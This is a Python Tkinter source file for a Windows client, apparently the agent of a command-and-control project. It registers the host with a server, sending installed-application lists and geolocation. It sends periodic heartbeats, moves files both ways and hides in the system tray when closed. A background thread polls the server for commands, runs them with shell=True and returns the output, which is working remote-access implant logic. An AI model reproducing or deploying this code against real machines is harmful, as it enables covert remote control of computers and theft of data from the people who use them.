import tkinter as tk
from tkinter import filedialog, messagebox, Toplevel
from tkinter.scrolledtext import ScrolledText
import requests
import platform
import time
import winreg
import subprocess
import threading
import os
import pystray
from PIL import Image, ImageDraw
import uuid
import sys
import psutil





def get_base_path():
    if getattr(sys, 'frozen', False):
        return sys._MEIPASS
    return os.path.dirname(os.path.abspath(__file__))


def get_local_path(filename):
    return os.path.join(os.path.expanduser("~"), filename)





LOCK_FILE = 'client.lock'


DEVICE_ID_FILE = get_local_path("device_id.txt")
USER_ID_FILE = get_local_path("user_id.txt")

device_id = None
user_id = None
os_name = platform.system()
os_version = platform.release()

last_watchlist_status = None


icon = None


def check_already_running():
    """Checks if the client is already running"""
    if os.path.exists(LOCK_FILE):
        with open(LOCK_FILE, 'r') as f:
            pid = int(f.read().strip())

        if psutil.pid_exists(pid):
            messagebox.showwarning("Warning", "Client is already running.")
            sys.exit(0)
        else:
            os.remove(LOCK_FILE)

    with open(LOCK_FILE, 'w') as f:
        f.write(str(os.getpid()))



def release_lock():
    """Removes the lock file when the application exits"""
    if os.path.exists(LOCK_FILE):
        os.remove(LOCK_FILE)

check_already_running()



def save_user_id(user_id):
    with open(USER_ID_FILE, 'w') as file:
        file.write(str(user_id))


def load_user_id():
    if os.path.exists(USER_ID_FILE):
        with open(USER_ID_FILE, 'r') as file:
            return file.read().strip()
    return None


def save_device_id(device_id):
    with open(DEVICE_ID_FILE, 'w') as file:
        file.write(str(device_id))


def load_device_id():
    if os.path.exists(DEVICE_ID_FILE):
        with open(DEVICE_ID_FILE, 'r') as file:
            return file.read().strip()
    return None





def get_installed_apps():
    apps = []
    try:
        reg_path = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall"
        reg_key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, reg_path, 0, winreg.KEY_READ | winreg.KEY_WOW64_64KEY)
        for i in range(winreg.QueryInfoKey(reg_key)[0]):
            try:
                subkey_name = winreg.EnumKey(reg_key, i)
                subkey = winreg.OpenKey(reg_key, subkey_name)
                app_name, _ = winreg.QueryValueEx(subkey, "DisplayName")
                apps.append(app_name)
            except (FileNotFoundError, OSError):
                pass
    except Exception as e:
        print(f"Error fetching installed apps: {e}")
    print(f"Installed apps: {apps}")  # Bu satırı ekledik
    return apps if apps else ["No installed applications found"]



def get_geolocation():
    try:
        response = requests.get('https://ipinfo.io')
        if response.status_code == 200:
            data = response.json()
            return data.get('loc', 'Unknown')
        else:
            return "Unknown"
    except Exception as e:
        print(f"Error fetching geolocation: {e}")
        return "Unknown"


def register_device():
    global device_id
    global user_id
    device_id = load_device_id()
    user_id = load_user_id() or str(uuid.uuid4())

    if not device_id:
        url = "http://localhost:5050/register"
        installed_apps = get_installed_apps()
        geolocation = get_geolocation()
        timestamp = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
        payload = {
            "os_name": os_name,
            "os_version": os_version,
            "installed_apps": installed_apps,
            "online_timestamp": timestamp,
            "geolocation": geolocation,
            "user_id": user_id
        }
        try:
            response = requests.post(url, json=payload)
            response_data = response.json()
            device_id = response_data.get("device_id")
            if device_id:
                save_device_id(device_id)
                save_user_id(user_id)
                print(f"Device registered with ID: {device_id} and user_id: {user_id}")
                add_device_to_watchlist()
            else:
                print("Device ID could not be retrieved from server response.")
        except requests.exceptions.RequestException as e:
            print(f"Failed to register device: {e}")
    else:
        print(f"Loaded existing device ID: {device_id}")
        add_device_to_watchlist()


def view_device_info_ui(permission_status):
    global device_id
    if not device_id:
        device_id = load_device_id()

    if permission_status == "Not Allowed":
        messagebox.showerror("Permission Denied", "You are not allowed to view this information.")
        return

    url = f"http://localhost:5050/view_device_info/{device_id}"
    try:
        response = requests.get(url)
        if response.status_code == 200:
            data = response.json()
            formatted_info = f"""
OS Name: {data['os_name']}
OS Version: {data['os_version']}
Online Timestamp: {data['online_timestamp']}
Geolocation: {data['geolocation']}
"""
            show_popup_info(formatted_info, data['installed_apps'])
        elif response.status_code == 403:
            messagebox.showerror("Error", "You are not allowed to view this information.")
        else:
            messagebox.showerror("Error", f"Error: {response.status_code}")
    except requests.exceptions.RequestException as e:
        messagebox.showerror("Request failed", f"Request failed: {e}")




def show_popup_info(info_text, installed_apps):
    popup = Toplevel(root)
    popup.title("Device Info")
    popup.geometry("400x400")
    popup.config(bg="#0a0f23")

    info_label = tk.Label(popup, text=info_text, fg="white", bg="#0a0f23", wraplength=350, font=("Helvetica", 10))
    info_label.pack(padx=10, pady=20)

    def show_installed_apps():
        show_more_button.pack_forget()
        app_list = ScrolledText(popup, width=60, height=10, bg="#0a0f23", fg="white", font=("Helvetica", 10), wrap=tk.NONE)
        app_list.insert(tk.END, '\n'.join(installed_apps))
        app_list.config(state=tk.DISABLED)
        app_list.pack(pady=10)

    show_more_button = tk.Button(popup, text="Show Installed Apps", command=show_installed_apps, bg="blue", fg="white")
    show_more_button.pack(pady=10)

    close_button = tk.Button(popup, text="Close", command=popup.destroy, bg="red", fg="white")
    close_button.pack(pady=10)






def add_device_to_watchlist():
    global device_id
    if not device_id:
        device_id = load_device_id()

    url = "http://localhost:5050/add_to_watchlist"
    payload = {"device_id": device_id}
    try:
        response = requests.post(url, json=payload)
        if response.status_code == 200:
            print(f"Device {device_id} added to watchlist.")
            messagebox.showinfo("Success", "Device added to watchlist!")
        else:
            print(f"Failed to add device to watchlist: {response.status_code}")
            messagebox.showerror("Error", f"Failed to add device to watchlist")
    except requests.exceptions.RequestException as e:
        print(f"Request failed: {e}")



def send_heartbeat():
    global device_id
    if not device_id:
        device_id = load_device_id()
    
    url = "http://localhost:5050/heartbeat"
    payload = {"device_id": device_id}
    try:
        response = requests.post(url, json=payload)
        response_data = response.json()
        print(f"Heartbeat response for device {device_id}: {response_data}")
        return response_data
    except requests.exceptions.RequestException as e:
        print(f"Failed to send heartbeat: {e}")
        return None



def check_watchlist_status():
    global device_id
    if not device_id:
        device_id = load_device_id()
    
    global last_watchlist_status
    url = "http://localhost:5050/watchlist_status"
    payload = {"device_id": device_id}
    try:
        response = requests.post(url, json=payload)
        if response.status_code == 200:
            status = response.json().get('watchlist_status')
            if status != last_watchlist_status:
                if status == "added":
                    status_label.config(text="Server Status: Online", fg="green")
                    messagebox.showinfo("Notification", "Your device has been added back to the watchlist.")
                elif status == "removed":
                    status_label.config(text="Server Status: Removed", fg="red")
                    messagebox.showinfo("Notification", "Your device has been removed from the watchlist.")
                last_watchlist_status = status
            return status
        return None
    except requests.exceptions.RequestException as e:
        print(f"Failed to check watchlist status: {e}")
        return None








def upload_file_to_server():
    filepath = filedialog.askopenfilename()
    if filepath:
        url = "http://localhost:5050/upload_file"
        try:
            with open(filepath, 'rb') as f:
                files = {'file': f}
                data = {'device_id': device_id}
                response = requests.post(url, files=files, data=data)
                if response.status_code == 200:
                    messagebox.showinfo("Success", f"File '{os.path.basename(filepath)}' uploaded successfully")
                else:
                    messagebox.showerror("Error", f"Failed to upload file: {response.text}")
        except Exception as e:
            messagebox.showerror("Error", f"Error uploading file: {e}")


def download_file_from_server():
    filename = filedialog.asksaveasfilename()
    if filename:
        url = f"http://localhost:5050/download_file/{os.path.basename(filename)}?device_id={device_id}"
        try:
            response = requests.get(url)
            if response.status_code == 200:
                with open(filename, 'wb') as f:
                    f.write(response.content)
                messagebox.showinfo("Success", f"File '{filename}' downloaded successfully")
            else:
                messagebox.showerror("Error", f"Failed to download file: {response.text}")
        except Exception as e:
            messagebox.showerror("Error", f"Error downloading file: {e}")







def get_command():
    url = "http://localhost:5050/get_command"
    try:
        response = requests.get(url)
        if response.status_code == 200:
            command = response.json().get('command')
            return command
        return None
    except requests.exceptions.RequestException as e:
        print(f"Failed to get command: {e}")
        return None


def execute_command(command):
    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        return result.stdout.strip() if result.returncode == 0 else result.stderr.strip()
    except Exception as e:
        return str(e)


def send_command_result(command, result):
    global device_id
    if not device_id:
        device_id = load_device_id()

    url = "http://localhost:5050/send_command_result"
    payload = {
        "device_id": device_id,
        "command": command,
        "result": result
    }

    print(f"Sending command result to server: {payload}")
    try:
        response = requests.post(url, json=payload)
        if response.status_code == 200:
            print(f"Command result sent successfully for device {device_id}")
        else:
            print(f"Failed to send command result, status code: {response.status_code}")
    except requests.exceptions.RequestException as e:
        print(f"Failed to send command result: {e}")


def log_interaction(device_id, interaction_type, details):
    with open('interaction_history.log', 'a') as f:
        log_message = f"{time.strftime('%Y-%m-%d %H:%M:%S')} - {interaction_type}: {details} (Device ID: {device_id})\n"
        f.write(log_message)
    print(f"Interaction logged: {log_message}")


def update_server_status():
    global last_watchlist_status
    status = check_watchlist_status()

    if status != last_watchlist_status:
        if status == "added":
            status_label.config(text="Server Status: Online", fg="green")
        elif status == "removed":
            status_label.config(text="Server Status: Removed", fg="red")
            messagebox.showinfo("Notification", "Your device has been removed from the watchlist.")
        last_watchlist_status = status
    
    root.after(5000, update_server_status)



def check_interaction_history_permission():
    global device_id
    if not device_id:
        device_id = load_device_id()

    url = f"http://localhost:5050/check_interaction_history_permission/{device_id}"
    try:
        response = requests.get(url)
        if response.status_code == 200:
            data = response.json()
            if data['allow_interaction_history_view']:
                view_interaction_history()
            else:
                messagebox.showerror("Permission Denied", "You are not allowed to view interaction history.")
        else:
            messagebox.showerror("Error", f"Error: {response.status_code}")
    except requests.exceptions.RequestException as e:
        messagebox.showerror("Request failed", f"Request failed: {e}")



def view_interaction_history():
    global device_id
    if not device_id:
        device_id = load_device_id()

    url = f"http://localhost:5050/get_interaction_history/{device_id}"
    try:
        response = requests.get(url)
        if response.status_code == 200:
            interaction_history = response.json().get('interaction_history', [])
            print("Interaction history fetched: ", interaction_history)
            show_popup_interaction_history(interaction_history)
        else:
            messagebox.showerror("Error", f"Error: {response.status_code}")
    except requests.exceptions.RequestException as e:
        messagebox.showerror("Request failed", f"Request failed: {e}")



def show_popup_interaction_history(interaction_history):
    popup = Toplevel(root)
    popup.title("Interaction History")
    popup.geometry("400x400")
    popup.config(bg="#0a0f23")

    info_label = tk.Label(popup, text="Interaction History:", fg="white", bg="#0a0f23", font=("Helvetica", 12))
    info_label.pack(padx=10, pady=10)

    history_list = ScrolledText(popup, width=45, height=15, bg="#0a0f23", fg="white", font=("Helvetica", 10))

    for item in interaction_history:
        history_str = '\n'.join([f"{key}: {value}" for key, value in item.items()])
        history_list.insert(tk.END, history_str + '\n\n')

    history_list.config(state=tk.DISABLED)
    history_list.pack(padx=10, pady=10)

    close_button = tk.Button(popup, text="Close", command=popup.destroy, bg="red", fg="white")
    close_button.pack(pady=10)



def create_tray_icon():
    global icon
    if not icon:
        icon = pystray.Icon("Client", create_image(), "Client Running", menu=pystray.Menu(
            pystray.MenuItem("Show", on_show_window),
            pystray.MenuItem("Quit", on_quit)
        ))
    return icon



def create_image():
    image = Image.new('RGB', (64, 64), (255, 255, 255))
    d = ImageDraw.Draw(image)
    d.rectangle((16, 16, 48, 48), fill=(0, 0, 0))
    return image

def on_quit(icon, item):
    release_lock()
    icon.stop()
    root.quit()

def on_show_window(icon, item):
    root.deiconify()

def on_hide_window():
    """Uygulama penceresini tepsiye gizler"""
    root.withdraw()
    tray_icon = create_tray_icon()
    if not tray_icon.visible:
        tray_icon.run_detached()

def on_closing():
    """Called when the user clicks the close (X) button, hiding the window instead of closing"""
    on_hide_window()


def tray_thread():
    on_hide_window()





def start_heartbeat():
    while True:
        send_heartbeat()
        time.sleep(10)


def check_for_commands():
    while True:
        command = get_command()
        if command:
            print(f"Received command: {command}")
            result = execute_command(command)
            send_command_result(command, result)
        time.sleep(5)



def on_enter(e):
    e.widget['background'] = '#555'

def on_leave(e):
    e.widget['background'] = e.widget.defaultBackground


root = tk.Tk()
root.title("Client Application")
root.geometry("600x600")
root.config(bg="#0a0f23")
root.protocol("WM_DELETE_WINDOW", on_closing)


logo = tk.PhotoImage(file="C:\\Users\\Admin\\Desktop\\c2_yeniden\\logo.png")
logo_label = tk.Label(root, image=logo, bg="#0a0f23")
logo_label.pack(pady=10)


button_frame = tk.Frame(root, bg="#0a0f23")
button_frame.pack(pady=20)


def create_button(text, command, row, column, color):
    btn = tk.Button(button_frame, text=text, command=command, bg=color, fg="white", font=("Helvetica", 12), width=15)
    btn.grid(row=row, column=column, padx=10, pady=10)
    btn.defaultBackground = color
    btn.bind("<Enter>", on_enter)
    btn.bind("<Leave>", on_leave)




create_button("Register Device", register_device, 0, 0, "green")
create_button("Upload File", upload_file_to_server, 1, 0, "blue")
create_button("Download File", download_file_from_server, 1, 1, "orange")
create_button("View Device Info", lambda: view_device_info_ui("Allowed"), 2, 0, "purple")
create_button("View Interaction History", check_interaction_history_permission, 2, 1, "purple")




status_label = tk.Label(root, text="Server Status: Unknown", fg="white", bg="#0a0f23", font=("Helvetica", 14))
status_label.pack(pady=20)


info_label = tk.Label(root, text="Device Info: Not Fetched", fg="white", bg="#0a0f23", font=("Helvetica", 12), wraplength=500)
info_label.pack(pady=10)


root.after(1000, update_server_status)


heartbeat_thread = threading.Thread(target=start_heartbeat, daemon=True)
heartbeat_thread.start()


command_thread = threading.Thread(target=check_for_commands, daemon=True)
command_thread.start()


tray_thread = threading.Thread(target=tray_thread, daemon=True)
tray_thread.start()


root.mainloop()
release_lock()
